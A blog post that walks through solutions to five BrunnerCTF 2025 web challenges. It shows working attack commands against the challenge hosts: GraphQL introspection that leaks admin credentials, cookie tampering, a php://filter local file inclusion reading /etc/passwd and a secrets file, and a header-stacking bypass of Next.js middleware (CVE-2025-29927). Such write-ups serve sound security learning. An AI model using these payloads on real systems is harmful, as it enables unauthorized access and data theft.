---
layout: post
title:  "Brunner 2025 Web Challenges"
date:   2025-08-24 20:20:30 -0400
author: robo.uzi
tags: [CTF, Web]
permalink: /brunnerctf-2025-web/
---
* TOC
{:toc}

## Where Robots Cannot Search
**Category:** Web

**Difficulty:** Beginner  
**Author:** The Mikkel
Ahh, the Brunnerne company.  
But they have a secret, hidden away from robot search.

At `https://where-robots-cannot-search-c53fac4f578c9aad.challs.brunnerne.xyz/robots.txt` I see:
```
User-agent: *
Disallow: /admin
Disallow: /private
Disallow: /hidden
Disallow: /flag.txt
```
`https://where-robots-cannot-search-c53fac4f578c9aad.challs.brunnerne.xyz/flag.txt`:
`brunner{r0bot5_sh0u1d_nOt_637_h3re_b0t_You_g07_h3re}`.

___

## Cookie Jar
**Category:** Web

**Difficulty:** Beginner  
**Author:** Quack
We just got our hands on grandma's legendary cookie jar! What delicious treats could she be hiding here?

I go to `https://cookie-jar-cb852a7b9e5bfb07.challs.brunnerne.xyz/` and inspect my cookie with Cookie Editor. The cookie is `isPremium = false`. I set it to `true` and get the flag.
`brunner{C00k135_4R3_p0W3rFu1_4nD_D3l1c10u5!}`

___

## Brunner's Bakery
**Category:** Web

**Difficulty:** Medium  
**Author:** Quack

Recent Graphs show that we need some more Quality of Life recipes! Can you go check if the bakery is hiding any?!

I open `https://brunner-s-bakery.challs.brunnerne.xyz/` and see it making a POST request to a graphql endpoint. 

I run `graphqlmap` to make enumeration easy:
```shell
graphqlmap -u https://brunner-s-bakery.challs.brunnerne.xyz/graphql --json  
  _____                 _      ____  _                               
 / ____|               | |    / __ \| |                              
| |  __ _ __ __ _ _ __ | |__ | |  | | |     _ __ ___   __ _ _ __     
| | |_ | '__/ _` | '_ \| '_ \| |  | | |    | '_ ` _ \ / _` | '_ \    
| |__| | | | (_| | |_) | | | | |__| | |____| | | | | | (_| | |_) |  
 \_____|_|  \__,_| .__/|_| |_|\___\_\______|_| |_| |_|\__,_| .__/    
                 | |                                       | |       
                 |_|                                       |_|       
                             Author: @pentest_swissky Version: 1.1    
GraphQLmap > help  
[+] dump_via_introspection : dump GraphQL schema (fragment+FullType)  
[+] dump_via_fragment      : dump GraphQL schema (IntrospectionQuery)  
[+] nosqli      : exploit a nosql injection inside a GraphQL query  
[+] postgresqli : exploit a sql injection inside a GraphQL query  
[+] mysqli      : exploit a sql injection inside a GraphQL query  
[+] mssqli      : exploit a sql injection inside a GraphQL query  
[+] exit        : gracefully exit the application  
GraphQLmap > dump_via_introspection  
============= [SCHEMA] ===============  
e.g: name[Type]: arg (Type!)  
  
00: Query  
       publicRecipes[None]:    
       secretRecipes[None]:    
       me[]:    
01: Mutation  
       login[AuthPayload]: username (String!), password (String!),    
03: AuthPayload  
       token[String]:    
       user[User]:    
04: Recipe  
       id[ID]:    
       name[String]:    
       description[String]:    
       isSecret[Boolean]:    
       author[User]:    
       ingredients[None]:    
07: Ingredient  
       name[String]:    
       supplier[Supplier]:    
08: Supplier  
       id[ID]:    
       name[String]:    
       owner[User]:    
09: User  
       id[ID]:    
       username[String]:    
       displayName[String]:    
       email[]:    
       notes[]:    
       privateNotes[]:    
       recipes[None]:    
10: __Schema  
11: __Type  
13: __Field  
14: __InputValue  
15: __EnumValue  
16: __Directive
```

I run this to check every feild possible without authentication:
```shell
curl -s -X POST https://brunner-s-bakery.challs.brunnerne.xyz/graphql -H "Content-Type: application/json" -d '{"query":"{ publicRecipes { id name description isSecret author { id username displayName email notes privateNotes recipes { name description } } ingredients { name suppli  
er { id name owner { id username displayName } } } } }"}'
```
In the output I see `"notes":"TODO: Remove temporary credentials... brunner_admin:Sw33tT00Th321?"`.

I grab the login token:
```shell
curl -s -X POST https://brunner-s-bakery.challs.brunnerne.xyz/graphql -H "Content-Type: application/json" -d '{"query":"mutation { login(username:\"brunner_admin\", password:\"Sw33tT00Th321?\") { token user { displayName } } }"}'  

{"data":{"login":{"token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6InUyIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNzU1OTExOTcwLCJleHAiOjE3NTU5MTkxNzB9.0rTozfQYnen2eTVDJhGLqg0yfbyaURiUl6bpRZv4sHk","user":{"displayName":"Brunner Admin"}}}}
```

I run this final curl command to get the flag:
```shell
curl -s -X POST https://brunner-s-bakery.challs.brunnerne.xyz/graphql -H "Content-Type: application/json" -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6InUyIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNzU1OTExOTcwLCJleHAiOjE3NTU5MTkxNzB9.0rTozfQYnen2eTVDJhGLqg0yfbyaURiUl6bpRZv4sHk" -d '{"query":"{ me { id username displayName email notes privateNotes recipes { id name description isSecret ingredients { name supplier { id name owner { id username displayName email notes privateNotes } } } } } }"}'
```
`brunner{Gr4phQL_1ntR0sp3ct10n_G035_R0UnD_4Nd_r0uND}`.

___

## Brunsviger Huset
**Category:** Web

**Difficulty:** Easy-Medium  
**Author:** ha1fdan

Welcome to "Brunsviger Huset" (House of Brunsviger), the oldest Danish bakery in town! Our bakers have been perfecting their craft for over 150 years, and our signature brunsviger is a favorite among locals and tourists alike. But, it seems like our bakery has a secret ingredient that's not on the menu... Can you find the hidden flag that's been baked into our website? Be warned, our bakers are notorious for their clever hiding spots!

I open the website at `https://brunsviger-huset-377bb418914e8dea.challs.brunnerne.xyz` and look at the source code. Towards the bottom I see a `printCalender()` function with this `print.php?file=/var/www/html/bakery-calendar.php&start=2025-07&end=2025-09`. 

I visit that link and see it provides a download for a pdf. 

Visiting `https://brunsviger-huset-377bb418914e8dea.challs.brunnerne.xyz/print.php?file=/etc/passwd` confirms arbitrary file read! 

On the robots.txt page I see 
```
User-agent: * 
Allow: /index.php 
Allow: /bakery-calendar.php 
Disallow: /print.php 
Disallow: /secrets.php
```

I cannot read these files directly. I can use PHP stream filter to encode the file contents. Visit `https://brunsviger-huset-377bb418914e8dea.challs.brunnerne.xyz/print.php?file=php://filter/convert.base64-encode/resource=/var/www/html/secrets.php`:
```shell
echo 'PD9waHAKLy8gS2VlcCB0aGlzIGZpbGUgc2VjcmV0LCBpdCBjb250YWlucyBzZW5zaXRpdmUgaW5mb3JtYXRpb24uCiRmbGFnID0gImJydW5uZXJ7bDBjNGxfZjFsM18xbmNsdXMxMG5fMW5fdGgzX2I0azNyeX0iOwo/Pgo=' | base64 -d  
<?php  
// Keep this file secret, it contains sensitive information.  
$flag = "brunner{l0c4l_f1l3_1nclus10n_1n_th3_b4k3ry}";  
?>
```
`php://filter/convert.base64-encode/resource=` wraps the target file and returns the file contents encoded in base64 instead of raw PHP.

___

## EPIC CAKE BATTLES OF HISTORY!!!
**Category:** Web

**Difficulty:** Medium  
**Author:** Emil8250

After all this time, it's finally time to figure out which cake is best: BRUNSVIGER VS. OTHELLO! _BEGIN!_

I am given the source code for the site. I host it with `sudo docker-compose up --build` to test locally. In the source code I see `middleware.ts`:
```t
import { NextResponse } from 'next/server'  
import type { NextRequest } from 'next/server'  
   
// This function can be marked `async` if using `await` inside  
export function middleware(request: NextRequest) {  
 // @ts-ignore  
   if("CHAMPION" == "FOUND")  
       return NextResponse.redirect(new URL('/admin', request.url))  
 return NextResponse.redirect(new URL('/', request.url))  
}  
   
// See "Matching Paths" below to learn more  
export const config = {  
 matcher: '/admin/:path*',  
}
```
I can see from the admin page that it will contain the flag:
```t
export default function Home() {  
   const flag = "brunner{REDACTED}"  
 return (  
       <span>{flag}</span>  
 );  
}
```

I find it is running `Next 15.2.2` which is vulnerable to CVE-2025-29927. I read about it here: [https://github.com/MuhammadWaseem29/CVE-2025-29927-POC/blob/main/README.md](https://github.com/MuhammadWaseem29/CVE-2025-29927-POC/blob/main/README.md). 

CVE-2025-29927 allows for authentication bypass in Next.js middleware. Next.js uses an internal header named `x-middleware-subrequest` to mark internal subrequests created by middleware.

In 15.x Next.js added a recursion guard. It keeps a colon separated stack of the middleware identifier in `x-middleware-subrequest` and stops calling middleware once the count hits `MAX_RECURSION_DEPTH = 5`. Stack it in the request 5 times and it will bypass auth completely:
```shell
curl -i -H "x-middleware-subrequest: src/middleware:src/middleware:src/middleware:src/middleware:src/middleware" https://epic-cake-battles-c75cf75a31a4b49a.challs.brunnerne.xyz/admin
```
`brunner{0th3llo-iz-b3st-cake}`

___
